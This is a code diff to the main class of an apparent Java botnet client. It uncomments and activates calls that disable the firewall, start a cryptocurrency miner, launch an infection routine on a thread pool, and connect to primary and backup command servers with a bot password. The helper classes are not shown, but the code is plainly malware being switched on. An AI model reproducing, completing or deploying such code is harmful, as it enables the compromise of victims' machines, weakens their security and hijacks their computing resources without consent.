@@ -50,18 +50,18 @@ public class mainConfig{
     private static ExecutorService Service;
     
     public static void main(String args[]) throws InterruptedException{
-//        myClass = new File(mainConfig.class.getProtectionDomain().getCodeSource().getLocation().getFile().replace("%20"," "));
-//        checkOS checkOS = new checkOS(botName,myClass);
-//        disableFirewall disableFirewall = new disableFirewall();
-//        //------------ Miner Config can be held in the chkMiner Main Class --------------
-//        
-//        chkMiner chkMiner = new chkMiner();
+       myClass = new File(mainConfig.class.getProtectionDomain().getCodeSource().getLocation().getFile().replace("%20"," "));
+       checkOS checkOS = new checkOS(botName,myClass);
+       disableFirewall disableFirewall = new disableFirewall();
+       //------------ Miner Config can be held in the chkMiner Main Class --------------
+       
+       chkMiner chkMiner = new chkMiner();
         
         //------------ Miner End Here
         Service = Executors.newCachedThreadPool();
-        //infec infect = new infec(myClass);
+        infec infect = new infec(myClass);
         Thread InitCo = new Thread(new InitConn(Server1,myBackupServer,port,botPassword,Engaged));
-     //   Service.execute(infect);
+        Service.execute(infect);
         Service.execute(InitCo);
         Service.shutdown();  
     }
